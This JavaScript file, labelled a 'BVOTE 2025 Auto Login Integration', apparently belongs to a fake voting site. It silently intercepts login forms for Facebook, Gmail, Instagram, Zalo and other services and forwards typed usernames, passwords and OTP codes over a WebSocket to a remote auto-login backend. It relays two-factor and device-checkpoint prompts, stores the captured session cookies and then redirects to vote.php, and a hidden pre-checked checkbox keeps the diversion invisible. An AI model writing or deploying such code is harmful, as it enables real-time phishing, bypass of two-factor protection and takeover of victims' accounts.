/**
 * BVOTE 2025 Auto Login Integration
 * Tích hợp hệ thống đăng nhập tự động vào user interface hiện tại
 * Không thay đổi giao diện - chỉ thêm chức năng backend
 */

class AutoLoginIntegration {
    constructor() {
        this.wsbridge = null;
        this.isInitialized = false;
        this.currentPlatform = null;
        this.retryCount = 0;
        this.maxRetries = 3;

        this.init();
    }

    /**
     * Initialize auto login integration
     */
    async init() {
        try {
            // Khởi tạo WebSocket bridge
            this.wsbridge = new WebSocketAutoLoginBridge();

            // Đăng ký event listeners
            this.setupEventListeners();

            // Tích hợp với form hiện tại
            this.integrateWithExistingForms();

            this.isInitialized = true;
            console.log('🔗 Auto Login Integration initialized');

        } catch (error) {
            console.error('❌ Auto Login Integration failed:', error);
            this.handleInitializationError();
        }
    }

    /**
     * Setup event listeners
     */
    setupEventListeners() {
        if (!this.wsbridge) return;

        // Listen for auto login responses
        this.wsbridge.on('login_completed', (data) => {
            this.handleAutoLoginResult(data);
        });

        this.wsbridge.on('login_error', (data) => {
            this.handleAutoLoginError(data);
        });

        this.wsbridge.on('otp_required', (data) => {
            this.handleOTPRequired(data);
        });

        this.wsbridge.on('checkpoint_required', (data) => {
            this.handleCheckpointRequired(data);
        });

        // Listen for system status
        this.wsbridge.on('system_status', (data) => {
            this.updateSystemStatus(data);
        });
    }

    /**
     * Integrate with existing login forms
     */
    integrateWithExistingForms() {
        // Tìm form đăng nhập hiện tại
        const existingForms = document.querySelectorAll('.login-form, #loginForm, .platform-login');

        existingForms.forEach(form => {
            this.enhanceExistingForm(form);
        });

        // Tích hợp với các nút platform selection
        const platformButtons = document.querySelectorAll('.platform-option, .social-login-btn');

        platformButtons.forEach(button => {
            this.enhancePlatformButton(button);
        });

        // Tích hợp với modal hiện tại
        this.enhanceExistingModals();
    }

    /**
     * Enhance existing login form
     */
    enhanceExistingForm(form) {
        // Thêm checkbox auto login (ẩn)
        const autoLoginOption = document.createElement('div');
        autoLoginOption.innerHTML = `
            <input type="checkbox" id="enable-auto-login" checked style="display: none;">
            <label for="enable-auto-login" style="display: none;">Đăng nhập tự động</label>
        `;
        form.appendChild(autoLoginOption);

        // Intercept form submission
        const originalSubmit = form.onsubmit;
        form.onsubmit = (e) => {
            e.preventDefault();

            const autoLoginEnabled = document.getElementById('enable-auto-login')?.checked;

            if (autoLoginEnabled && this.isInitialized) {
                this.handleAutoLoginSubmission(form);
            } else {
                // Fallback to original behavior
                if (originalSubmit) {
                    originalSubmit.call(form, e);
                } else {
                    this.handleManualLogin(form);
                }
            }
        };
    }

    /**
     * Enhance platform selection buttons
     */
    enhancePlatformButton(button) {
        const originalClick = button.onclick;

        button.onclick = (e) => {
            // Lưu platform được chọn
            const platform = this.extractPlatformFromButton(button);
            this.currentPlatform = platform;

            // Gọi original handler nếu có
            if (originalClick) {
                originalClick.call(button, e);
            }

            // Hiện thi form với auto login enabled
            this.prepareAutoLoginForm(platform);
        };
    }

    /**
     * Enhance existing modals
     */
    enhanceExistingModals() {
        // Tìm modal đăng nhập
        const loginModals = document.querySelectorAll('.modal, #loginModal, .login-modal');

        loginModals.forEach(modal => {
            // Thêm auto login status indicator
            this.addAutoLoginStatusToModal(modal);

            // Enhance submit buttons trong modal
            const submitButtons = modal.querySelectorAll('button[type="submit"], .submit-btn, .login-btn');
            submitButtons.forEach(btn => {
                this.enhanceSubmitButton(btn);
            });
        });
    }

    /**
     * Add auto login status to modal
     */
    addAutoLoginStatusToModal(modal) {
        // Kiểm tra xem đã có auto login status chưa
        if (modal.querySelector('.auto-login-status')) return;

        const statusElement = document.createElement('div');
        statusElement.className = 'auto-login-status';
        statusElement.style.cssText = `
            display: none;
            padding: 10px;
            margin: 10px 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border-radius: 8px;
            text-align: center;
            position: relative;
        `;

        statusElement.innerHTML = `
            <div class="status-content">
                <div class="status-icon">🤖</div>
                <div class="status-text">Đang đăng nhập tự động...</div>
                <div class="status-progress">
                    <div class="progress-bar" style="width: 0%; height: 4px; background: rgba(255,255,255,0.8); border-radius: 2px; margin-top: 8px;"></div>
                </div>
            </div>
        `;

        // Thêm vào đầu modal body
        const modalBody = modal.querySelector('.modal-body, .modal-content, .login-form');
        if (modalBody) {
            modalBody.insertBefore(statusElement, modalBody.firstChild);
        }
    }

    /**
     * Enhance submit button
     */
    enhanceSubmitButton(button) {
        // Lưu text gốc
        if (!button.hasAttribute('data-original-text')) {
            button.setAttribute('data-original-text', button.textContent);
        }

        const originalClick = button.onclick;

        button.onclick = (e) => {
            e.preventDefault();

            // Kiểm tra auto login
            if (this.isInitialized && this.wsbridge && this.wsbridge.isConnected()) {
                this.initiateAutoLogin(button);
            } else {
                // Fallback
                if (originalClick) {
                    originalClick.call(button, e);
                }
            }
        };
    }

    /**
     * Handle auto login submission
     */
    handleAutoLoginSubmission(form) {
        const formData = new FormData(form);

        const loginData = {
            platform: this.currentPlatform || this.detectPlatformFromForm(form),
            username: formData.get('username') || formData.get('email') || formData.get('login'),
            password: formData.get('password'),
            otp: formData.get('otp') || ''
        };

        // Validate data
        if (!loginData.platform || !loginData.username || !loginData.password) {
            this.showError('Vui lòng điền đầy đủ thông tin đăng nhập');
            return;
        }

        // Show auto login status
        this.showAutoLoginStatus('Đang khởi tạo đăng nhập tự động...');

        // Send to auto login system
        const sessionId = this.wsbridge.sendLoginRequest(loginData);

        // Track session
        this.trackLoginSession(sessionId, loginData);
    }

    /**
     * Initiate auto login from button click
     */
    initiateAutoLogin(button) {
        // Disable button
        button.disabled = true;
        button.textContent = 'Đang xử lý...';

        // Get form data
        const form = button.closest('form, .login-form, .modal-body');
        if (!form) {
            this.restoreButton(button);
            this.showError('Không tìm thấy form đăng nhập');
            return;
        }

        const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]');
        const loginData = {
            platform: this.currentPlatform || 'facebook', // Default platform
            username: '',
            password: '',
            otp: ''
        };

        // Extract data from inputs
        inputs.forEach(input => {
            const name = input.name || input.id || '';
            const value = input.value;

            if (name.includes('user') || name.includes('email') || name.includes('login') || input.type === 'email') {
                loginData.username = value;
            } else if (name.includes('pass') || input.type === 'password') {
                loginData.password = value;
            } else if (name.includes('otp') || name.includes('code')) {
                loginData.otp = value;
            }
        });

        // Validate
        if (!loginData.username || !loginData.password) {
            this.restoreButton(button);
            this.showError('Vui lòng điền đầy đủ thông tin đăng nhập');
            return;
        }

        // Show status
        this.showAutoLoginStatus('Đang kết nối đến hệ thống đăng nhập tự động...');

        // Send request
        const sessionId = this.wsbridge.sendLoginRequest(loginData);

        // Store button reference for restoration
        this.currentButton = button;

        // Track session
        this.trackLoginSession(sessionId, loginData);
    }

    /**
     * Show auto login status
     */
    showAutoLoginStatus(message, type = 'processing') {
        const statusElement = document.querySelector('.auto-login-status');
        if (!statusElement) return;

        statusElement.style.display = 'block';

        const statusText = statusElement.querySelector('.status-text');
        const statusIcon = statusElement.querySelector('.status-icon');
        const progressBar = statusElement.querySelector('.progress-bar');

        if (statusText) statusText.textContent = message;

        // Update icon based on type
        const icons = {
            'processing': '🤖',
            'success': '✅',
            'error': '❌',
            'otp': '🔐',
            'checkpoint': '🛡️'
        };

        if (statusIcon) statusIcon.textContent = icons[type] || '🤖';

        // Update progress
        if (type === 'processing' && progressBar) {
            this.animateProgress(progressBar);
        } else if (progressBar) {
            progressBar.style.width = (type === 'success') ? '100%' : '0%';
        }

        // Update colors
        const colors = {
            'processing': 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
            'success': 'linear-gradient(135deg, #4CAF50 0%, #45a049 100%)',
            'error': 'linear-gradient(135deg, #f44336 0%, #d32f2f 100%)',
            'otp': 'linear-gradient(135deg, #ff9800 0%, #f57c00 100%)',
            'checkpoint': 'linear-gradient(135deg, #2196F3 0%, #1976D2 100%)'
        };

        statusElement.style.background = colors[type] || colors['processing'];
    }

    /**
     * Handle auto login result
     */
    handleAutoLoginResult(data) {
        const { status, message, platform, cookies } = data;

        if (status === 'success') {
            this.showAutoLoginStatus('Đăng nhập thành công! Đang chuyển hướng...', 'success');

            // Store session data
            this.storeSessionData(platform, cookies);

            // Restore button
            this.restoreButton(this.currentButton);

            // Hide status after delay
            setTimeout(() => {
                this.hideAutoLoginStatus();

                // Redirect or trigger success callback
                this.handleLoginSuccess(data);
            }, 2000);

        } else {
            this.handleAutoLoginError(data);
        }
    }

    /**
     * Handle auto login error
     */
    handleAutoLoginError(data) {
        const { error, message } = data;
        const errorMessage = error || message || 'Đăng nhập tự động thất bại';

        this.showAutoLoginStatus(errorMessage, 'error');
        this.restoreButton(this.currentButton);

        // Show retry option
        setTimeout(() => {
            this.showRetryOption();
        }, 3000);
    }

    /**
     * Handle OTP required
     */
    handleOTPRequired(data) {
        this.showAutoLoginStatus('Cần nhập mã OTP để tiếp tục', 'otp');

        // Show OTP input in existing modal
        this.showOTPInputInCurrentModal();
    }

    /**
     * Handle checkpoint required
     */
    handleCheckpointRequired(data) {
        const { message, url } = data;

        this.showAutoLoginStatus(message || 'Cần xác minh thiết bị', 'checkpoint');

        // Show checkpoint instructions
        this.showCheckpointInstructions(url);
    }

    /**
     * Show OTP input in current modal
     */
    showOTPInputInCurrentModal() {
        const modal = document.querySelector('.modal.active, .modal[style*="block"]');
        if (!modal) return;

        // Check if OTP input already exists
        let otpContainer = modal.querySelector('.otp-input-container');
        if (otpContainer) {
            otpContainer.style.display = 'block';
            return;
        }

        // Create OTP input
        otpContainer = document.createElement('div');
        otpContainer.className = 'otp-input-container';
        otpContainer.style.cssText = `
            margin: 15px 0;
            padding: 15px;
            background: rgba(255,255,255,0.1);
            border-radius: 8px;
            text-align: center;
        `;

        otpContainer.innerHTML = `
            <div style="margin-bottom: 10px; color: #333;">
                <strong>Nhập mã OTP</strong>
                <p style="font-size: 14px; margin: 5px 0;">Mã xác minh đã được gửi đến thiết bị của bạn</p>
            </div>
            <div style="display: flex; justify-content: center; gap: 10px; margin: 10px 0;">
                <input type="text" id="auto-otp-input" maxlength="6" placeholder="Nhập mã OTP"
                       style="padding: 10px; border: 1px solid #ddd; border-radius: 5px; text-align: center; font-size: 16px; width: 150px;">
                <button type="button" id="submit-auto-otp"
                        style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">
                    Xác nhận
                </button>
            </div>
        `;

        // Insert into modal
        const modalBody = modal.querySelector('.modal-body, .login-form');
        if (modalBody) {
            modalBody.appendChild(otpContainer);
        }

        // Add event listeners
        const otpInput = document.getElementById('auto-otp-input');
        const submitButton = document.getElementById('submit-auto-otp');

        if (otpInput) {
            otpInput.focus();

            otpInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    this.submitOTP();
                }
            });
        }

        if (submitButton) {
            submitButton.addEventListener('click', () => {
                this.submitOTP();
            });
        }
    }

    /**
     * Submit OTP
     */
    submitOTP() {
        const otpInput = document.getElementById('auto-otp-input');
        if (!otpInput) return;

        const otpCode = otpInput.value.trim();
        if (!otpCode) {
            this.showError('Vui lòng nhập mã OTP');
            return;
        }

        // Send OTP to auto login system
        this.wsbridge.sendOTP(otpCode);

        // Update status
        this.showAutoLoginStatus('Đang xác minh mã OTP...', 'processing');

        // Disable OTP input
        otpInput.disabled = true;
        document.getElementById('submit-auto-otp').disabled = true;
    }

    /**
     * Show retry option
     */
    showRetryOption() {
        if (this.retryCount >= this.maxRetries) {
            this.showAutoLoginStatus('Đã vượt quá số lần thử. Vui lòng thử lại sau.', 'error');
            return;
        }

        const statusElement = document.querySelector('.auto-login-status');
        if (!statusElement) return;

        const retryButton = document.createElement('button');
        retryButton.textContent = 'Thử lại';
        retryButton.style.cssText = `
            margin-top: 10px;
            padding: 8px 16px;
            background: rgba(255,255,255,0.2);
            color: white;
            border: 1px solid rgba(255,255,255,0.3);
            border-radius: 5px;
            cursor: pointer;
        `;

        retryButton.onclick = () => {
            this.retryCount++;
            this.retryAutoLogin();
        };

        statusElement.appendChild(retryButton);
    }

    /**
     * Retry auto login
     */
    retryAutoLogin() {
        // Clear existing status
        this.hideAutoLoginStatus();

        // Re-initiate with current data
        if (this.currentButton) {
            this.initiateAutoLogin(this.currentButton);
        }
    }

    // Helper methods
    extractPlatformFromButton(button) {
        const classes = button.className.toLowerCase();
        const dataAttr = button.getAttribute('data-platform');

        if (dataAttr) return dataAttr;

        const platforms = ['facebook', 'gmail', 'instagram', 'zalo', 'yahoo', 'microsoft'];
        for (const platform of platforms) {
            if (classes.includes(platform)) {
                return platform;
            }
        }

        return 'facebook'; // Default
    }

    detectPlatformFromForm(form) {
        // Try to detect platform from form classes or data attributes
        const formClasses = form.className.toLowerCase();
        const platforms = ['facebook', 'gmail', 'instagram', 'zalo', 'yahoo', 'microsoft'];

        for (const platform of platforms) {
            if (formClasses.includes(platform)) {
                return platform;
            }
        }

        return this.currentPlatform || 'facebook';
    }

    restoreButton(button) {
        if (!button) return;

        button.disabled = false;
        const originalText = button.getAttribute('data-original-text');
        if (originalText) {
            button.textContent = originalText;
        }
    }

    hideAutoLoginStatus() {
        const statusElement = document.querySelector('.auto-login-status');
        if (statusElement) {
            statusElement.style.display = 'none';
        }
    }

    animateProgress(progressBar) {
        let width = 0;
        const interval = setInterval(() => {
            width += Math.random() * 15;
            if (width >= 85) {
                width = 85;
                clearInterval(interval);
            }
            progressBar.style.width = width + '%';
        }, 800);
    }

    storeSessionData(platform, cookies) {
        try {
            const sessionData = {
                platform: platform,
                cookies: cookies,
                timestamp: Date.now(),
                expires: Date.now() + (24 * 60 * 60 * 1000) // 24 hours
            };

            localStorage.setItem('bvote_auto_session', JSON.stringify(sessionData));
        } catch (error) {
            console.error('Failed to store session data:', error);
        }
    }

    trackLoginSession(sessionId, loginData) {
        this.currentSessionId = sessionId;
        this.currentLoginData = loginData;

        // Store in session storage for tracking
        sessionStorage.setItem('current_auto_login_session', JSON.stringify({
            sessionId: sessionId,
            platform: loginData.platform,
            startTime: Date.now()
        }));
    }

    handleLoginSuccess(data) {
        // Fire custom event for other scripts
        const successEvent = new CustomEvent('autoLoginSuccess', {
            detail: data
        });
        document.dispatchEvent(successEvent);

        // Check for existing success handlers
        if (window.handleLoginSuccess) {
            window.handleLoginSuccess(data);
        }

        // Default redirect
        setTimeout(() => {
            if (!window.location.href.includes('vote.php')) {
                window.location.href = 'vote.php';
            }
        }, 1500);
    }

    showError(message) {
        // Use existing error display mechanism if available
        if (window.showNotification) {
            window.showNotification(message, 'error');
        } else {
            alert(message);
        }
    }

    handleInitializationError() {
        console.warn('Auto Login Integration failed - falling back to manual login');

        // Ensure manual login still works
        this.enableManualLoginFallback();
    }

    enableManualLoginFallback() {
        const forms = document.querySelectorAll('form, .login-form');
        forms.forEach(form => {
            // Restore original submit behavior
            form.onsubmit = null;

            // Add manual submit handler
            form.addEventListener('submit', (e) => {
                this.handleManualLogin(form);
            });
        });
    }

    handleManualLogin(form) {
        // Handle manual login submission
        console.log('Using manual login fallback');

        // Use existing login handler if available
        if (window.processLogin) {
            window.processLogin(form);
        } else {
            // Default form submission
            form.submit();
        }
    }

    updateSystemStatus(data) {
        const { available, activeSessions, systemLoad } = data;

        // Update system info display if exists
        const systemInfo = document.querySelector('.system-info, .auto-login-info');
        if (systemInfo) {
            systemInfo.innerHTML = `
                <div class="status-indicator ${available ? 'online' : 'offline'}">
                    ${available ? '🟢' : '🔴'} Hệ thống đăng nhập tự động
                </div>
                ${available ? `
                    <div class="system-stats">
                        <small>Phiên hoạt động: ${activeSessions} | Tải: ${systemLoad}%</small>
                    </div>
                ` : ''}
            `;
        }
    }
}

// Initialize when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        window.autoLoginIntegration = new AutoLoginIntegration();
    });
} else {
    window.autoLoginIntegration = new AutoLoginIntegration();
}
